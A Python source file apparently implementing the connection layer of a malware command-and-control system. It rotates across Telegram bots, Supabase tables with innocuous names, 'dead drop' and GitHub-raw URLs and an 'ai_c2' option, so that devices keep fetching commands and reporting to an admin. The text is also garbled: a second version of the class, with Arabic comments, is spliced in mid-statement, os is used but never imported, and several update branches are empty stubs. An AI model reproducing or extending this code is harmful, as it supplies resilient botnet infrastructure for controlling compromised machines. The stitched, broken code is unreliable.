#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import threading
import time
import logging
import requests
import json
import base64
import telebot
from supabase import create_client
from typing import Optional, Dict, List, Any

class ConnectionManager:
    def __init__(self, config: dict, crypto):
        self.crypto = crypto
        self.config = config
        self.telegram_tokens = config['telegram']['tokens']
        self.supabase_urls = config['supabase']['urls']
        self.supabase_keys = config['supabase']['keys']
        self.dead_drop_urls = config['dead_drop']['urls']
        self.github_raw_urls = config['github_raw']['urls']
        self.discord_webhooks = config.get('discord_webhooks', {}).get('urls', [])
        self.ai_c2 = config.get('ai_c2', {'enabled': False, 'endpoints': []})

        self.active_telegram = 0
        self.active_supabase = 0
        self.lock = threading.Lock()
        self.bots = [telebot.TeleBot(token) for token in self.telegram_tokens if token]
        self.supabase_clients = []
        for i in range(min(len(self.supabase_urls), len(self.supabase_keys))):
            if self.supabase_urls[i] and self.supabase_keys[i]:
                self.supabase_clients.append(create_client(self.supabase_urls[i], self.supabase_keys[i]))

    def get_active_telegram_token(self) -> Optional[str]:
        with self.lock:
            if self.bots and self.active_telegram < len(self.bots):
                return self.telegram_tokens[self.active_telegram]
            return None

    def get_active_supabase(self) -> Optional[Dict[str, str]]:
        with self.lock:
            if self.supabase_clients and self.active_supabase < len(self.supabase_clients):
                return {
                    'url': self.supabase_urls[self.active_supabase],
                    'key': self.supabase_keys[self.active_supabase]
                }
            return None

    def get_active_dead_drop(self) -> Optional[str]:
        with self.lock:
            if self.dead_drop_urls:
                return self.dead_drop_urls[0]
            return None

    def get_active_github_raw(self) -> Optional[str]:
        with self.lock:
            if self.github_raw_urls:
                return self.github_raw_urls[0]
            return None

    def rotate_telegram(self):
        with self.lock:
            if len(self.bots) > 1:
                self.active_telegram = (self.active_telegram + 1) % len(self.bots)
                logging.info(f"Switched to Telegram bot index {self.active_telegram}")

    def rotate_supabase(self):
        with self.lock:
            if len(self.supabase_clients) > 1:
                self.active_supabase = (self.active_supabase + 1) % len(self.supabase_clients)
                logging.info(f"Switched to Supabase index {self.active_supabase}")

    def rotate_dead_drop(self):
        with self.lock:
            if len(self.dead_drop_urls) > 1:
                self.dead_drop_urls.append(self.dead_drop_urls.pop(0))
                logging.info("Switched to next Dead Drop")

    def rotate_github_raw(self):
        with self.lock:
            if len(self.github_raw_urls) > 1:
                self.github_raw_urls.append(self.github_raw_urls.pop(0))
                logging.info("Switched to next GitHub raw")

    def test_telegram_token(self, token: str) -> bool:
        try:
            url = f"https://api.telegram.org/bot{token}/getMe"
            r = requests.get(url, timeout=10)
            return r.status_code == 200
        except Exception:
            return False

    def test_supabase(self, url: str, key: str) -> bool:
        try:
            headers = {"apikey": key, "Authorization": f"Bearer {key}"}
            r = requests.get(f"{url}/rest/v1/pos_clients?select=client_serial&limit=1", headers=headers, timeout=10)
            return r.status_code == 200
        except Exception:
            return False

    def test_url(self, url: str) -> bool:
        try:
            r = requests.get(url, timeout=10)
            return r.status_code < 500
        except Exception:
            return False

    def check_all_connections(self) -> Dict[str, bool]:
        status = {}
        current_tg = self.get_active_telegram_token()
        if current_tg:
            if not self.test_telegram_token(current_tg):
                self.rotate_telegram()
                status['telegram'] = False
            else:
                status['telegram'] = True

        current_sup = self.get_active_supabase()
        if current_sup:
            if not self.test_supabase(current_sup['url'], current_sup['key']):
                self.rotate_supabase()
                status['supabase'] = False
            else:
                status['supabase'] = True

        current_dd = self.get_active_dead_drop()
        if current_dd:
            if not self.test_url(current_dd):
                self.rotate_dead_drop()
                status['dead_drop'] = False
            else:
                status['dead_drop'] = True

        current_gh = self.get_active_github_raw()
        if current_gh:
            if not self.test_url(current_gh):
                self.rotate_github_raw()
                status['github_raw'] = False
            else:
                status['github_raw'] = True

        return status

    def fetch_pending_commands(self, device_id: str, supabase_client=None) -> List[Dict]:
        commands = []
        if supabase_client:
            try:
                resp = supabase_client.table('service_requests') \
                    .select('*') \
                    .eq('target_client', device_id) \
                    .eq('ticket_status', 'open') \
                    .execute()
                commands.extend(resp.data)
                for cmd in resp.data:
                    supabase_client.table('service_requests') \
                        .update({'ticket_status': 'processing'}) \
                        .eq('ticket_id', cmd['ticket_id']) \
                        .execute()
            except Exception as e:
                logging.error(f"Failed to fetch commands from Supabase: {e}")

        dd_url = self.get_active_dead_drop()
        if dd_url:
            try:
                full_url = f"{dd_url.rstrip('/')}/{device_id}.json"
                r = requests.get(full_url, timeout=10)
                if r.status_code == 200:
                    data = r.json()
                    if isinstance(data, dict) and 'encrypted' in data and self.crypto:
                        encrypted = base64.b64decode(data['encrypted'])
                        decrypted = self.crypto.decrypt_stored_key(encrypted)
                        data = json.loads(decrypted)
                    if isinstance(data, list):
                        commands.extend(data)
            except Exception as e:
                logging.error(f"Failed to fetch from Dead Drop: {e}")

        gh_url = self.get_active_github_raw()
        if gh_url:
            try:
                full_url = f"{gh_url.rstrip('/')}/{device_id}.json"
                r = requests.get(full_url, timeout=10)
                if r.status_code == 200:
                    data = r.json()
                    if isinstance(data, list):
                        commands.extend(data)
            except Exception as e:
                logging.error(f"Failed to fetch from GitHub raw: {e}")

        return commands

    def send_message_to_admin(self, text: str):
        max_attempts = len(self.bots) * 2
        for attempt in range(max_attempts):
            idx = (self.active_telegram + attempt) % len(self.bots) if self.bots else -1
            if idx == -1:
                logging.error("No Telegram bots available")
                return
            try:
                self.bots[idx].send_message(os.environ.get('ADMIN_ID'), text, parse_mode='Markdown')
                self.active_telegram = idx
                return
            except Exception as e:
                logging.warning(f"Bot {idx} failed: {e}")
        logging.error("All Telegram bots failed to send message")

    def get_active_config(self) -> Dict[str, Any]:
        return {
            'telegram': {
                'primary': self.get_active_telegram_token(),
                'backups': [t for i, t in enumerate(self.telegram_tokens) if i != self.active_telegram]
            },
            'supabase': self.get_active_supabase(),
            'dead_drop': self.get_active_dead_drop(),
            'github_raw': self.get_active_github_raw(),
            'commands_interval': 60,
            'heartbeat_interval': 300,
            'failover_retry': 30
        }                latency = (time.time() - start) * 1000  # ميلي ثانية
                self.bot_latency[idx] = latency

                # تحديث الفهرس النشط إلى هذا البوت (للاستخدامات القادمة)
                with self._lock:
                    self.active_bot_index = idx
                return True
            except Exception as e:
                logging.warning(f"Bot {idx} failed to send message: {e}")
                continue

        logging.error("All bots failed to send message.")
        return False

    # ------------------------------------------------------------
    # إدارة قنوات Supabase
    # ------------------------------------------------------------
    def get_active_supabase(self) -> Optional[Any]:
        """يعيد عميل Supabase النشط حالياً."""
        with self._lock:
            if not self.supabase_clients:
                return None
            return self.supabase_clients[self.active_supabase_index]

    def execute_supabase_query(self, table: str, query_type: str, **kwargs) -> Optional[Dict]:
        """
        تنفيذ استعلام على Supabase مع Failover.
        query_type: 'select', 'insert', 'update', 'upsert', 'delete'
        """
        if not self.supabase_clients:
            logging.error("No Supabase clients available.")
            return None

        for i in range(len(self.supabase_clients)):
            idx = (self.active_supabase_index + i) % len(self.supabase_clients)
            client = self.supabase_clients[idx]
            try:
                start = time.time()
                if query_type == 'select':
                    result = client.table(table).select(kwargs.get('columns', '*')).eq(kwargs.get('column'), kwargs.get('value')).execute()
                elif query_type == 'insert':
                    result = client.table(table).insert(kwargs.get('data')).execute()
                elif query_type == 'update':
                    result = client.table(table).update(kwargs.get('data')).eq(kwargs.get('column'), kwargs.get('value')).execute()
                elif query_type == 'upsert':
                    result = client.table(table).upsert(kwargs.get('data')).execute()
                elif query_type == 'delete':
                    result = client.table(table).delete().eq(kwargs.get('column'), kwargs.get('value')).execute()
                else:
                    logging.error(f"Unknown query type: {query_type}")
                    return None

                latency = (time.time() - start) * 1000
                self.supabase_latency[idx] = latency

                with self._lock:
                    self.active_supabase_index = idx
                return result.data if hasattr(result, 'data') else result
            except Exception as e:
                logging.warning(f"Supabase client {idx} failed: {e}")
                continue

        logging.error("All Supabase clients failed.")
        return None

    # ------------------------------------------------------------
    # إدارة Dead Drops
    # ------------------------------------------------------------
    def fetch_dead_drop(self, index: int = 0) -> Optional[str]:
        """
        يجلب محتوى Dead Drop من الرابط المحدد بالفهرس.
        يعيد المحتوى كنص (عادة JSON مشفر) أو None إذا فشل.
        """
        if not self.dead_drop_urls:
            logging.warning("No Dead Drop URLs configured.")
            return None

        if index >= len(self.dead_drop_urls):
            index = 0

        url = self.dead_drop_urls[index]
        try:
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200:
                return resp.text
            else:
                logging.warning(f"Dead Drop {url} returned {resp.status_code}")
                return None
        except Exception as e:
            logging.warning(f"Failed to fetch Dead Drop {url}: {e}")
            return None

    def update_from_dead_drops(self) -> bool:
        """
        يقرأ جميع Dead Drops ويحاول تحديث الإعدادات المحلية.
        يعيد True إذا نجح التحديث من أي مصدر.
        """
        for i, url in enumerate(self.dead_drop_urls):
            content = self.fetch_dead_drop(i)
            if content:
                # هنا يمكن فك تشفير المحتوى وتحديث الإعدادات
                # سنفترض أن المحتوى JSON عادي (غير مشفر للتبسيط)
                try:
                    import json
                    new_config = json.loads(content)
                    # تحديث قائمة البوتات أو الروابط
                    if 'telegram_tokens' in new_config:
                        # إعادة تهيئة البوتات
                        pass
                    if 'supabase_url' in new_config:
                        # إعادة تهيئة Supabase
                        pass
                    logging.info(f"Configuration updated from Dead Drop {url}")
                    return True
                except Exception as e:
                    logging.error(f"Failed to parse Dead Drop content: {e}")
        return False

    # ------------------------------------------------------------
    # فحص شامل للاتصالات (يستخدم بواسطة FailoverTester)
    # ------------------------------------------------------------
    def check_all_connections(self) -> Dict[str, bool]:
        """
        يختبر جميع قنوات الاتصال ويعيد قاموساً بحالة كل قناة.
        """
        status = {}

        # فحص البوتات
        for i, bot in enumerate(self.bots):
            try:
                bot.get_me()  # عملية بسيطة لاختبار الاتصال
                status[f'bot_{i}'] = True
            except Exception as e:
                status[f'bot_{i}'] = False
                logging.warning(f"Bot {i} health check failed: {e}")

        # فحص Supabase
        for i, client in enumerate(self.supabase_clients):
            try:
                # استعلام بسيط عن جدول pos_clients (يفترض وجوده)
                client.table('pos_clients').select('entry_id').limit(1).execute()
                status[f'supabase_{i}'] = True
            except Exception as e:
                status[f'supabase_{i}'] = False
                logging.warning(f"Supabase client {i} health check failed: {e}")

        # فحص Dead Drops (محاولة الوصول إلى أول رابط)
        if self.dead_drop_urls:
            try:
                requests.get(self.dead_drop_urls[0], timeout=5)
                status['dead_drop'] = True
            except:
                status['dead_drop'] = False
        else:
            status['dead_drop'] = False

        return status

    def get_active_config(self) -> Dict[str, Any]:
        """
        يعيد الإعدادات الحالية التي يجب إرسالها للأجهزة.
        """
        return {
            'telegram': {
                'primary': self.bots[self.active_bot_index].token if self.bots else None,
                'backups': [b.token for b in self.bots[self.active_bot_index+1:]] if self.bots else []
            },
            'supabase': {
                'url': self.supabase_clients[self.active_supabase_index].supabase_url if self.supabase_clients else None
            },
            'dead_drop': self.dead_drop_urls,
            'commands_interval': 60,          # ثانية بين كل سحب أوامر
            'heartbeat_interval': 300,         # ثانية بين نبضات القلب
            'failover_retry': 30,               # ثانية قبل إعادة محاولة القناة الفاشلة
      }
